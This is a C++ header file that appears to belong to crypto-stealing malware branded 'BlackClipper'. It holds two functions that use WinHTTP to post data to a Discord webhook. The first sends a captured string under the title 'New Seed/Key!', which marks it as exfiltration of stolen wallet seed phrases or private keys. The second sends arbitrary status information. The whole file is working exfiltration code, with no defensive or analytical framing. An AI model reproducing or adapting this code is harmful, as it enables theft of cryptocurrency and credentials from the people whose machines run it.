#pragma once
#include <Windows.h>
#include <string>
#include <iostream>
#include <stdio.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <fstream>
#include <LMCons.h>
#pragma comment(lib, "winhttp.lib")

int __server_send(std::string sKeyOrSeed) {
    HINTERNET hSession = WinHttpOpen(L"xxxh8ef",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookPath = L"/api/webhooks/" + std::wstring(cWebhookId, cWebhookId + strlen(cWebhookId)) + L"/" + std::wstring(cWebhookToken, cWebhookToken + strlen(cWebhookToken));
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        webhookPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string title = "New Seed/Key!";
    std::string desc = sKeyOrSeed;
    std::string color = "16711680"; // Decimal color
    std::string request_body = "{\"username\": \"BlackClipper\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"BlackClipper\"},\"color\": " + color + " }], \"attachments\": []}";

    BOOL bResults = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n",
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

int __server_send_info(std::string sTitle, std::string sDescription) {
    HINTERNET hSession = WinHttpOpen(L"xxxdh8ef",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookPath = L"/api/webhooks/" + std::wstring(cWebhookId, cWebhookId + strlen(cWebhookId)) + L"/" + std::wstring(cWebhookToken, cWebhookToken + strlen(cWebhookToken));
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        webhookPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string title = sTitle;
    std::string desc = sDescription;
    std::string color = "16711680"; 
    std::string request_body = "{\"username\": \"BlackClipper\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"BlackClipper\"},\"color\": " + color + " }], \"attachments\": []}";

    BOOL bResults = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n",
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}
